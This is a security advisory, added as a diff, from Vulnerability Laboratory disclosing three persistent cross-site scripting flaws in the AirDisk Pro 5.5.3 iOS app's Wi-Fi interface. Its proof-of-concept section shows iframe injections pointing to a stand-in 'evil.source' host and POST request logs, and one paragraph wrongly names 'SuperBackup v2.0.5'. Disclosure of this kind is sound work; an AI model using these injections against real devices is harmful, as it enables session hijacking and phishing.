@@ -1,0 +1,417 @@
+# Title: AirDisk Pro 5.5.3 for iOS - Persistent Cross-Site Scripting
+# Author: Vulnerability Laboratory
+# Date: 2020-04-15
+# Vendor: http://www.app2pro.com
+# Software Link: https://apps.apple.com/us/app/airdisk-pro-wireless-flash/id505904421
+# CVE: N/A
+
+Document Title:
+===============
+AirDisk Pro v5.5.3 iOS - Multiple Persistent Vulnerabilities
+
+
+References (Source):
+====================
+https://www.vulnerability-lab.com/get_content.php?id=2203
+
+
+Release Date:
+=============
+2020-04-15
+
+
+Vulnerability Laboratory ID (VL-ID):
+====================================
+2203
+
+
+Common Vulnerability Scoring System:
+====================================
+4.5
+
+
+Vulnerability Class:
+====================
+Cross Site Scripting - Persistent
+
+
+Current Estimated Price:
+========================
+1.000€ - 2.000€
+
+
+Product & Service Introduction:
+===============================
+File sharing with other iOS devices via Bluetooth or Wi-Fi connection
+with automatic search of nearest devices.
+Users can perform file operations on the application like: Copy, Move,
+Zip, Unzip, Rename, Delete, Email, and more.
+Easy to create file like: Text File, New folder, Playlist, Take
+Photo/Video, Import From Library, and Voice Record.
+AirDisk Pro allows you to store, view and manage files on your iPhone,
+iPad or iPod touch. You can connect to AirDisk
+Pro from any Mac or PC over the Wi-Fi network and transfer files by drag
+& drop files straight from the Finder or Windows
+Explorer. AirDisk Pro features document viewer, PDF reader, music
+player, image viewer, voice recorder, text editor, file
+manager and support most of the file operations: like delete, move,
+copy, email, share, zip, unzip and more.
+
+(Copy of the Homepage:
+https://apps.apple.com/us/app/airdisk-pro-wireless-flash/id505904421 )
+(Copy of the Homepage: http://www.app2pro.com )
+
+
+Abstract Advisory Information:
+==============================
+The vulnerability laboratory core research team discovered multiple
+persistent web vulnerabilities in the AirDisk Pro v5.5.3 ios mobile
+application.
+
+
+Affected Product(s):
+====================
+Felix Yew
+Product: AirDisk Pro v5.5.3 (iOS)
+
+
+Vulnerability Disclosure Timeline:
+==================================
+2020-04-15: Public Disclosure (Vulnerability Laboratory)
+
+
+Discovery Status:
+=================
+Published
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+===============
+Medium
+
+
+Authentication Type:
+====================
+No authentication (guest)
+
+
+User Interaction:
+=================
+Low User Interaction
+
+
+Disclosure Type:
+================
+Independent Security Research
+
+
+Technical Details & Description:
+================================
+Multiple persistent cross site scripting vulnerability has been
+discovered in the official SuperBackup v2.0.5 ios mobile application.
+The vulnerability allows remote attackers to inject own malicious script
+codes with persistent attack vector to compromise the mobile
+web-application from the application-side.
+
+The first vulnerability is located in the `createFolder` parameter of
+the `Create Folder` function. Attackers are able to name
+or rename paths via airdisk pro ui to malicious persistent script codes.
+Thus allows to execute the persistent injected script
+code on the front site of the path index listing in the content itself
+on each refresh. The request method to inject is POST
+and the attack vector is located on the application-side. Interaction to
+exploit is as well possible through the unauthenticated
+started ftp service on the local network.
+
+The second vulnerability is located in the `deleteFile` parameter of the
+`Delete` function. The output location with the popup
+that asks for permission to delete, allows to execute the script code.
+The injection point is the file parameter and the execution
+point occurs in the visible delete popup with the permission question.
+The request method to inject is POST and the attack vector
+is located on the application-side.
+
+The third web vulnerability is located in the `devicename` parameter
+that is displayed on the top next to the airdisk pro ui logo.
+Remote attackers are able to inject own malicious persistent script code
+by manipulation of the local apple devicename information.
+The injection point is the devicename information and the execution
+point occurs in the file sharing ui panel of the airdisk pro
+mobile web-application.
+
+Remote attackers are able to inject own script codes to the client-side
+requested vulnerable web-application parameters. The attack
+vector of the vulnerability is persistent and the request method to
+inject/execute is POST. The vulnerabilities are classic client-side
+cross site scripting vulnerabilities. Successful exploitation of the
+vulnerability results in session hijacking, persistent phishing
+attacks, persistent external redirects to malicious source and
+persistent manipulation of affected application modules.
+
+Request Method(s):
+[+] POST
+
+Vulnerable Module(s):
+[+] AirDisk pro Wifi UI
+
+Vulnerable Parameter(s):
+[+] createFolder
+[+] deleteFile
+[+] devicename
+
+
+Proof of Concept (PoC):
+=======================
+The persistent input validation web vulnerabilities can be exploited by
+remote attackers with wifi access with low user interaction.
+For security demonstration or to reproduce the vulnerability follow the
+provided information and steps below to continue.
+
+
+1. Create Folder
+
+PoC: Vulnerable Source
+<tbody>
+<form name="checkbox_form"></form>
+<tr><td class="e"><input type="checkbox" name="selection"
+value="test"></td><td class="i"><a href="test/"><img
+src="/webroot/fileicons/folder.png"
+width="20" height="20"></a></td><td class="n"><a
+href="test/">test</a></td><td class="m">11 Apr 2020 at 12:35</td><td
+class="s"></td><td class="k">Folder</td>
+<td class="e"><span style="height:15px;
+width:15px;">&nbsp;</span></td><td class="e"><a href="#" title="Rename
+file" onclick="modalPopup("test", 0, 0);">
+<img src="/webroot/webrename.png" width="15" height="15"></a></td><td
+class="e"><a href="#" title="Delete file"
+onclick="modalPopup("test", 2, 0);">
+<img src="/webroot/webdelete.png" width="15"
+height="15"></a></td></tr><tr class="c"><td class="e"><input
+type="checkbox" name="selection"
+value="test%3E%22%3Ciframe%20src=a%3E"></td><td class="i"><a
+href="[MALICIOUS INJECTED SCRIPT
+CODE!]test%3E%22%3Ciframe%20src=evil.source%3E/">
+<img src="/webroot/fileicons/folder.png" width="20"
+height="20"></a></td><td class="n">
+<a href="[MALICIOUS INJECTED SCRIPT
+CODE!]test%3E%22%3Ciframe%20src=evil.source%3E/">test>"<iframe
+src="evil.source"></a></td>
+<td class="m">11 Apr 2020 at 13:01</td><td class="s"></td><td
+class="k">Folder</td><td class="e"><span style="height:15px;
+width:15px;">&nbsp;</span></td><td class="e">
+<a href="#" title="Rename file"
+onClick="modalPopup("test%3E%22%3Ciframe%20src=evil.source%3E&quot[MALICIOUS
+INJECTED SCRIPT CODE!];, 0, 1);">
+<img src="/webroot/webrename.png" width="15" height="15"/></a></td><td
+class="e">
+<a href="#" title="Delete file"
+onClick="modalPopup("test%3E%22%3Ciframe%20src=evil.source%3E&quot[MALICIOUS
+INJECTED SCRIPT CODE!];, 2, 1);">
+<img src="/webroot/webdelete.png" width="15"
+height="15"/></a></td></tr><tr><td class="e"><input type="checkbox"
+name="selection" value="Help.webarchive" /></td>
+<td class="i"><a href="Help.webarchive"><img
+src="/webroot/fileicons/webarchive.png" width="20"
+height="20"></a></td><td class="n">
+<a href="Help.webarchive">Help.webarchive</a></td><td class="m">6 Dec
+2019 at 05:22</td><td class="s">13.7 KB</td><td class="k">Safari Web
+Archive</td>
+<td class="e"><a href="#" title="Download file"
+onClick="downloadFile("Help.webarchive");"><img
+src="/webroot/webdownload.png"
+width="15" height="15"/></a></td><td class="e"><a href="#" title="Rename
+file" onClick="modalPopup("Help.webarchive", 0, 2);">
+<img src="/webroot/webrename.png" width="15" height="15"/></a></td><td
+class="e"><a href="#" title="Delete file"
+onClick="modalPopup("Help.webarchive", 2, 2);"><img
+src="/webroot/webdelete.png" width="15" height="15"/></a></td></tr>
+</form>
+</tbody>
+</table>
+</div>
+
+
+--- PoC Session logs [POST] ---
+http://localhost:80/
+Host: localhost:80
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0)
+Gecko/20100101 Firefox/75.0
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 68
+Origin: http://localhost:80
+Connection: keep-alive
+Referer: http://localhost:80/
+Upgrade-Insecure-Requests: 1
+createFolder=test>"<[MALICIOUS INJECTED SCRIPT
+CODE!]>&ID=0&submitButton=Create
+-
+POST: HTTP/1.1 200 OK
+Accept-Ranges: bytes
+Content-Length: 6257
+
+Note: Adding via ftp on mkdir or file is as well possible without
+authentication on default setup.
+
+
+
+2. Delete / Old Popup
+
+PoC: Vulnerable Source
+<div id="modal-content" class="simplemodal-data" style="display: block;">
+	<div id="modal-title"><h3>Delete File</h3></div>
+	<div id="modal-text"><a>Are you sure you want to delete this
+file?"test"</a></div>
+	<form name="input" action="" method="post">
+	<div id="modal-field"><input type="hidden" name="deleteFile"
+value="test"<iframe src="evil.source">[MALICIOUS INJECTED SCRIPT
+CODE]"></div>
+	<input type="hidden" name="ID" id="ID" value="test">
+	<input type="submit" name="submitButton" id="submitButton" value="Delete">
+	</form>
+</div>
+
+
+--- PoC Session logs [POST] ---
+http://localhost:80/
+Host: localhost:80
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0)
+Gecko/20100101 Firefox/75.0
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 55
+Origin: http://localhost:80
+Connection: keep-alive
+Referer: http://localhost:80/evil.source
+Upgrade-Insecure-Requests: 1
+deleteFile=New Folder&ID=New Folder&submitButton=Delete
+-
+POST: HTTP/1.1 200 OK
+Accept-Ranges: bytes
+Content-Length: 4699
+
+
+Note: Comes up when somebody tries to delete the malicious injected path.
+
+
+3. Devicename
+
+
+PoC: Vulnerable Source
+<div id="headerWraper">
+	<table border="0" cellspacing="0" cellpadding="0" width="100%">
+	  <tr>
+	    <td><a href="./"><img src="/webroot/webicon.png" id="headerImg"
+width="57" height="57"/></a></td>
+	    <td><h2>[MALICIOUS INJECTED SCRIPT CODE AS DEVICENAME]</h2></td>	
+	  </tr>
+    </table>
+</div>
+
+
+--- PoC Session logs [GET] ---
+http://localhost:80/
+Host: localhost:80
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0)
+Gecko/20100101 Firefox/75.0
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 55
+Origin: http://localhost:80
+Connection: keep-alive
+Referer: http://localhost:80/evil.source
+Upgrade-Insecure-Requests: 1
+-
+GET: HTTP/1.1 200 OK
+Accept-Ranges: bytes
+Content-Length: 4612
+
+Note: Executes each time the wifi sharing ui service of airdisk pro is
+opened by the local or remote users.
+
+
+Solution - Fix & Patch:
+=======================
+1. Disallow special chars in the folder and filenames. Sanitize all
+inputs and filter all involved parameters to  prevent application-side
+attacks.
+2. Parse the output location of the popup permission message content to
+prevent further executions after injects via post method.
+3. Sanitize the devicename displayed on top of the wifi user interaction
+by a secure parsing mechanism.
+
+
+Security Risk:
+==============
+The security risk of the persistent input validation web vulnerabilities
+in the application functions are estimated as medium.
+
+
+Credits & Authors:
+==================
+Vulnerability-Lab -
+https://www.vulnerability-lab.com/show.php?user=Vulnerability-Lab
+Benjamin Kunz Mejri -
+https://www.vulnerability-lab.com/show.php?user=Benjamin%20K.M.
+
+
+Disclaimer & Information:
+=========================
+The information provided in this advisory is provided as it is without
+any warranty. Vulnerability Lab disclaims all warranties,
+either expressed or implied, including the warranties of merchantability
+and capability for a particular purpose. Vulnerability-Lab
+or its suppliers are not liable in any case of damage, including direct,
+indirect, incidental, consequential loss of business profits
+or special damages, even if Vulnerability-Lab or its suppliers have been
+advised of the possibility of such damages. Some states do
+not allow the exclusion or limitation of liability for consequential or
+incidental damages so the foregoing limitation may not apply.
+We do not approve or encourage anybody to break any licenses, policies,
+deface websites, hack into databases or trade with stolen data.
+
+Domains:    www.vulnerability-lab.com		www.vuln-lab.com			
+www.vulnerability-db.com
+Services:   magazine.vulnerability-lab.com
+paste.vulnerability-db.com 			infosec.vulnerability-db.com
+Social:	    twitter.com/vuln_lab		facebook.com/VulnerabilityLab 		
+youtube.com/user/vulnerability0lab
+Feeds:	    vulnerability-lab.com/rss/rss.php
+vulnerability-lab.com/rss/rss_upcoming.php
+vulnerability-lab.com/rss/rss_news.php
+Programs:   vulnerability-lab.com/submit.php
+vulnerability-lab.com/register.php
+vulnerability-lab.com/list-of-bug-bounty-programs.php
+
+Any modified copy or reproduction, including partially usages, of this
+file requires authorization from Vulnerability Laboratory.
+Permission to electronically redistribute this alert in its unmodified
+form is granted. All other rights, including the use of other
+media, are reserved by Vulnerability-Lab Research Team or its suppliers.
+All pictures, texts, advisories, source code, videos and other
+information on this website is trademark of vulnerability-lab team & the
+specific authors or managers. To record, list, modify, use or
+edit our material contact (admin@ or research@) to get a ask permission.
+
+				    Copyright © 2020 | Vulnerability Laboratory - [Evolution
+Security GmbH]™
+
+
+
+
+-- 
+VULNERABILITY LABORATORY - RESEARCH TEAM
